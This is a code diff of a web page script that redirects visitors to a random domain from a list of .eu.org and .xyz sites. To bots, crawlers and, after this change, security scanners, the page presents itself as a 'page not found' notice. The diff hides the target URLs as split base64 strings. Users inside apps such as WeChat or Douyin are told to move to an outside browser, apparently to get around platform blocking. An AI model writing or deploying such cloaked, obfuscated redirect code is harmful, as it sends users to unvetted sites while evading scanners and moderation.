@@ -32,42 +32,53 @@
 <script>
 (function(){
   var ua=navigator.userAgent||'';
-  if(/bot|spider|crawl|slurp|bingpreview|facebookexternalhit|twitterbot|telegrambot|whatsapp|preview|headless|curl|wget|python|scrapy|httpclient/i.test(ua)){
+  if(/bot|spider|crawl|slurp|bingpreview|facebookexternalhit|twitterbot|telegrambot|whatsapp|preview|headless|curl|wget|python|scrapy|httpclient|monitor|scanner|scan/i.test(ua)){
     document.body.innerHTML='<div class="box"><h1>页面不存在</h1></div>';
     return;
   }
-  var targets=[
-    'https://www.4545.eu.org/','https://www.455333.xyz/','https://www.466333.xyz/',
-    'https://www.4666.eu.org/','https://www.477333.xyz/','https://www.488333.xyz/',
-    'https://www.6767.eu.org/','https://www.994555.xyz/','https://www.bizi.eu.org/',
-    'https://www.buqu.eu.org/','https://www.daba.eu.org/','https://www.nixi.eu.org/',
-    'https://www.qima.eu.org/'
+  var isInApp=/micromessenger|wechat|\bqq\/(?!.*qqbrowser)|douyin|aweme|tiktok|kwai|kuaishou|snssdk|bytedance|weibo|alipayclient|dingtalk|baiduboxapp/i.test(ua);
+  if(isInApp){
+    showGuide('');
+    return;
+  }
+  function dec(a,b,c){return atob(a+b+c)}
+  var pool=[
+    ['aHR0cHM6Ly93','d3cuNDU0NS5l','dS5vcmcv'],['aHR0cHM6Ly93','d3cuNDU1MzMz','Lnh5ei8='],
+    ['aHR0cHM6Ly93','d3cuNDY2MzMz','Lnh5ei8='],['aHR0cHM6Ly93','d3cuNDY2Ni5l','dS5vcmcv'],
+    ['aHR0cHM6Ly93','d3cuNDc3MzMz','Lnh5ei8='],['aHR0cHM6Ly93','d3cuNDg4MzMz','Lnh5ei8='],
+    ['aHR0cHM6Ly93','d3cuNjc2Ny5l','dS5vcmcv'],['aHR0cHM6Ly93','d3cuOTk0NTU1','Lnh5ei8='],
+    ['aHR0cHM6Ly93','d3cuYml6aS5l','dS5vcmcv'],['aHR0cHM6Ly93','d3cuYnVxdS5l','dS5vcmcv'],
+    ['aHR0cHM6Ly93','d3cuZGFiYS5l','dS5vcmcv'],['aHR0cHM6Ly93','d3cubml4aS5l','dS5vcmcv'],
+    ['aHR0cHM6Ly93','d3cucWltYS5l','dS5vcmcv']
   ];
   var hasCrypto=window.crypto&&window.crypto.getRandomValues;
   var n=hasCrypto?window.crypto.getRandomValues(new Uint32Array(1))[0]:Math.floor(Math.random()*4294967296);
-  var target=targets[(n+0)%targets.length];
-  var isInApp=/micromessenger|wechat|\bqq\/(?!.*qqbrowser)|douyin|aweme|tiktok|kwai|kuaishou|snssdk|bytedance|weibo|alipayclient|dingtalk|baiduboxapp/i.test(ua);
-  if(!isInApp){location.replace(target);return;}
-  var app='App';
-  if(/micromessenger|wechat/i.test(ua))app='微信';
-  else if(/\bqq\//i.test(ua)&&!/qqbrowser/i.test(ua))app='QQ';
-  else if(/douyin|aweme|tiktok|snssdk|bytedance/i.test(ua))app='抖音';
-  else if(/kwai|kuaishou/i.test(ua))app='快手';
-  else if(/weibo/i.test(ua))app='微博';
-  else if(/alipayclient/i.test(ua))app='支付宝';
-  document.getElementById('loading').style.display='none';
-  document.getElementById('guide').style.display='block';
-  document.getElementById('guideTitle').textContent='请不要在 '+app+' 内直接打开';
-  document.getElementById('guideDesc').textContent=app+' 内置浏览器可能限制播放或拦截跳转，建议复制地址到 Chrome / Edge / Safari 打开。';
-  var copyBtn=document.getElementById('copyBtn');
-  copyBtn.onclick=function(){
-    function ok(){copyBtn.textContent='已复制，去浏览器粘贴打开';copyBtn.style.background='#16a34a'}
-    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(target).then(ok).catch(fallback)}else fallback();
-    function fallback(){var i=document.createElement('input');i.value=target;document.body.appendChild(i);i.select();document.execCommand('copy');document.body.removeChild(i);ok()}
-  };
-  document.getElementById('continueBtn').href=target;
-  document.getElementById('chromeBtn').href='googlechrome://navigate?url='+encodeURIComponent(target);
-  document.getElementById('edgeBtn').href='microsoft-edge:'+target;
+  var item=pool[(n+0)%pool.length];
+  var target=dec(item[0],item[1],item[2]);
+  location.replace(target);
+
+  function showGuide(target){
+    var app='App';
+    if(/micromessenger|wechat/i.test(ua))app='微信';
+    else if(/\bqq\//i.test(ua)&&!/qqbrowser/i.test(ua))app='QQ';
+    else if(/douyin|aweme|tiktok|snssdk|bytedance/i.test(ua))app='抖音';
+    else if(/kwai|kuaishou/i.test(ua))app='快手';
+    else if(/weibo/i.test(ua))app='微博';
+    else if(/alipayclient/i.test(ua))app='支付宝';
+    document.getElementById('loading').style.display='none';
+    document.getElementById('guide').style.display='block';
+    document.getElementById('guideTitle').textContent='请不要在 '+app+' 内直接打开';
+    document.getElementById('guideDesc').textContent=app+' 内置浏览器可能限制播放或拦截跳转，建议回到首页复制入口到 Chrome / Edge / Safari 打开。';
+    document.getElementById('copyBtn').onclick=function(){
+      var u=location.origin+'/';
+      function ok(){document.getElementById('copyBtn').textContent='已复制首页地址';document.getElementById('copyBtn').style.background='#16a34a'}
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(u).then(ok).catch(fallback)}else fallback();
+      function fallback(){var i=document.createElement('input');i.value=u;document.body.appendChild(i);i.select();document.execCommand('copy');document.body.removeChild(i);ok()}
+    };
+    document.getElementById('continueBtn').href='/';
+    document.getElementById('chromeBtn').href='googlechrome://navigate?url='+encodeURIComponent(location.origin+'/');
+    document.getElementById('edgeBtn').href='microsoft-edge:'+location.origin+'/';
+  }
 })();
 </script>
 </body>
